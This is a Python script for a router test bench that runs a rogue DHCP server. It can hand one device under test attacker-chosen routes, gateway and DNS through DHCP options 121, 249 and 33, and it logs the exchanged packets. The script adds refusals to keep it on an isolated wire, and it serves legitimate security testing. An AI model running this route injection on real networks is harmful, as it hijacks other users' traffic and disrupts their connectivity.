#!/usr/bin/env python3
"""A DHCP server for the WAN side of the bench, and a refusal to run anywhere else.

Why this exists (register items P8-19, and the route-injection half of it)
--------------------------------------------------------------------------
`P8-19` asks what an attacker upstream of this router can do with a DHCP lease.
Answering it needs a DHCP server that says exactly what the test wants said --
including options a real server would never send -- and that is not something
`dnsmasq` is convenient for. It also needs the *packets* on the record, because
"the device took the lease" and "the device asked and I answered" are different
claims and only a capture separates them.

On 2026-08-18 this was a throwaway script, and the throwaway could not deliver
the interesting half: the device's own DISCOVER lists options 1, 33, 121, 249,
3, 6, 12, 15, 28, 44, 46 and 47, so **it asks for three different flavours of
route injection**, and none was ever sent because forcing a renew needed LAN
access the cable position denied. This one carries them.

The refusals, and why the first one is the important one
--------------------------------------------------------
A DHCP server answers anything that asks. Started on the wrong interface it
hands addresses, a default route and a DNS server to whatever else is on that
wire -- a housemate's laptop, a phone, the machine you are reading this on. That
is not a bench test, it is an outage someone else has to debug.

So:

  * it binds to ONE interface, by name, with SO_BINDTODEVICE, and refuses to
    start without one;
  * it refuses an interface that carries the default route;
  * it refuses an interface whose own address is not in the subnet it is about
    to hand out, because that combination means the operator is thinking of a
    different wire from the one the socket is on;
  * it refuses to answer a client whose MAC is not the one expected, when
    `--only-mac` is given -- the bench has exactly one device under test.

    sudo python3 tools/rogue-dhcp.py --iface enx... --server 192.168.77.1 \
         --offer 192.168.77.100 --seconds 120 --json out.json
    sudo python3 tools/rogue-dhcp.py --iface enx... --server 192.168.77.1 \
         --offer 192.168.77.100 --route 10.0.0.0/8=192.168.77.66 --seconds 120
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import struct
import sys
import time
from pathlib import Path

MAGIC = b"\x63\x82\x53\x63"
DISCOVER, OFFER, REQUEST, ACK = 1, 2, 3, 5


def ip2b(text):
    return socket.inet_aton(text)


def b2ip(raw):
    return socket.inet_ntoa(raw)


def parse_options(data):
    out, i = {}, 0
    while i < len(data):
        code = data[i]
        if code == 255:
            break
        if code == 0:
            i += 1
            continue
        length = data[i + 1]
        out[code] = data[i + 2:i + 2 + length]
        i += 2 + length
    return out


def encode_routes(pairs, classless=True):
    """Option 121/249 (classless) or 33 (static) payloads."""
    if not classless:
        out = b""
        for cidr, gw in pairs:
            net, _bits = cidr.split("/")
            out += ip2b(net) + ip2b(gw)
        return out
    out = b""
    for cidr, gw in pairs:
        net, bits = cidr.split("/")
        bits = int(bits)
        octets = (bits + 7) // 8
        out += bytes([bits]) + ip2b(net)[:octets] + ip2b(gw)
    return out


def build_reply(kind, xid, mac, args, routes):
    frame = struct.pack(
        ">BBBBIHH4s4s4s4s16s64s128s",
        2, 1, 6, 0, xid, 0, 0,
        b"\0\0\0\0", ip2b(args.offer), ip2b(args.server), b"\0\0\0\0",
        mac + b"\0" * (16 - len(mac)), b"\0" * 64, b"\0" * 128)
    opts = MAGIC
    opts += bytes([53, 1, kind])
    opts += bytes([54, 4]) + ip2b(args.server)
    opts += bytes([51, 4]) + struct.pack(">I", args.lease)
    opts += bytes([1, 4]) + ip2b(args.netmask)
    opts += bytes([3, 4]) + ip2b(args.router or args.server)
    opts += bytes([6, 4]) + ip2b(args.dns or args.server)
    if args.domain:
        d = args.domain.encode()
        opts += bytes([15, len(d)]) + d
    if routes:
        classless = encode_routes(routes, True)
        opts += bytes([121, len(classless)]) + classless
        opts += bytes([249, len(classless)]) + classless
        static = encode_routes(routes, False)
        opts += bytes([33, len(static)]) + static
    opts += b"\xff"
    return frame + opts


def default_route_iface():
    try:
        with open("/proc/net/route", encoding="ascii") as fh:
            next(fh)
            for line in fh:
                f = line.split()
                if len(f) > 2 and f[1] == "00000000":
                    return f[0]
    except OSError:
        pass
    return None


def iface_addr(name):
    import fcntl
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        packed = fcntl.ioctl(sock.fileno(), 0x8915,
                             struct.pack("256s", name[:15].encode()))
        return socket.inet_ntoa(packed[20:24])
    except OSError:
        return None
    finally:
        sock.close()


def same_subnet(a, b, mask):
    ai = struct.unpack(">I", ip2b(a))[0]
    bi = struct.unpack(">I", ip2b(b))[0]
    mi = struct.unpack(">I", ip2b(mask))[0]
    return (ai & mi) == (bi & mi)


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--iface", required=True, help="the ONE interface to serve on")
    p.add_argument("--server", required=True, help="this host's address on that wire")
    p.add_argument("--offer", required=True, help="the address to hand the device")
    p.add_argument("--netmask", default="255.255.255.0")
    p.add_argument("--router", default=None, help="option 3 (default: --server)")
    p.add_argument("--dns", default=None, help="option 6 (default: --server)")
    p.add_argument("--domain", default=None, help="option 15")
    p.add_argument("--lease", type=int, default=600, help="option 51, seconds")
    p.add_argument("--route", action="append", default=[],
                   help="CIDR=GATEWAY, repeatable. Sent as options 121, 249 AND "
                        "33 together, because this device's DISCOVER asks for "
                        "all three and which one it honours is the question")
    p.add_argument("--only-mac", default=None,
                   help="answer only this client MAC (aa:bb:cc:dd:ee:ff)")
    p.add_argument("--seconds", type=float, default=120.0)
    p.add_argument("--json", default=None)
    p.add_argument("--i-know-this-serves-addresses", action="store_true",
                   help="acknowledge the interface check when it is wrong about "
                        "your setup. Read the refusal first")
    args = p.parse_args(argv)

    if os.geteuid() != 0:
        print("rogue-dhcp: needs root to bind udp/67", file=sys.stderr)
        return 2

    # Refusal 1, and it is the one that matters: a DHCP server on the wrong wire
    # is somebody else's outage.
    if args.iface == default_route_iface() and not args.i_know_this_serves_addresses:
        print(f"rogue-dhcp: {args.iface} carries this host's default route. A "
              "DHCP server there answers whatever else is on that wire -- that "
              "is not a bench test. Name the isolated interface, or pass "
              "--i-know-this-serves-addresses if this really is the lab wire.",
              file=sys.stderr)
        return 2
    have = iface_addr(args.iface)
    if have is None:
        print(f"rogue-dhcp: {args.iface} has no IPv4 address. Give it "
              f"{args.server}/{args.netmask} first.", file=sys.stderr)
        return 2
    if not same_subnet(have, args.offer, args.netmask):
        print(f"rogue-dhcp: {args.iface} is {have}, and you are about to offer "
              f"{args.offer}/{args.netmask}. Those are different wires in your "
              "head and the same socket in the kernel. Fix one of them.",
              file=sys.stderr)
        return 2

    routes = []
    for spec in args.route:
        cidr, _, gw = spec.partition("=")
        if "/" not in cidr or not gw:
            print(f"rogue-dhcp: --route wants CIDR=GATEWAY, got {spec!r}",
                  file=sys.stderr)
            return 2
        routes.append((cidr, gw))

    want_mac = None
    if args.only_mac:
        want_mac = bytes.fromhex(args.only_mac.replace(":", ""))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, args.iface.encode())   # SO_BINDTODEVICE
    sock.bind(("", 67))
    sock.settimeout(1.0)

    log = {"iface": args.iface, "server": args.server, "offer": args.offer,
           "routes": routes, "packets": [], "leased": False}
    print(f"rogue-dhcp: serving on {args.iface} ({have}), offering {args.offer}"
          + (f", routes {routes}" if routes else "")
          + f", for {args.seconds:.0f}s")
    deadline = time.time() + args.seconds
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(2048)
        except TimeoutError:
            continue
        if len(data) < 240 or data[236:240] != MAGIC:
            continue
        xid = struct.unpack(">I", data[4:8])[0]
        mac = data[28:34]
        opts = parse_options(data[240:])
        kind = opts.get(53, b"\0")[0]
        requested = opts.get(55, b"")
        entry = {"from": addr[0], "xid": f"0x{xid:08x}",
                 "mac_tail": mac[-3:].hex(), "type": kind,
                 "requested_options": list(requested)}
        log["packets"].append(entry)
        name = {DISCOVER: "DISCOVER", REQUEST: "REQUEST"}.get(kind, str(kind))
        print(f"  <<< {name} xid=0x{xid:08x} requests options "
              f"{','.join(str(b) for b in requested)}")
        if want_mac and mac[:6] != want_mac:
            print("      (ignored: not --only-mac)")
            continue
        if kind == DISCOVER:
            sock.sendto(build_reply(OFFER, xid, mac[:6], args, routes),
                        ("255.255.255.255", 68))
            print(f"  >>> OFFER {args.offer}")
        elif kind == REQUEST:
            sock.sendto(build_reply(ACK, xid, mac[:6], args, routes),
                        ("255.255.255.255", 68))
            print(f"  >>> ACK {args.offer}")
            log["leased"] = True
    sock.close()
    print(f"rogue-dhcp: {len(log['packets'])} client packet(s), "
          f"lease {'completed' if log['leased'] else 'NOT completed'}")
    if args.json:
        Path(args.json).write_text(json.dumps(log, indent=2) + "\n", encoding="utf-8")
    return 0 if log["packets"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
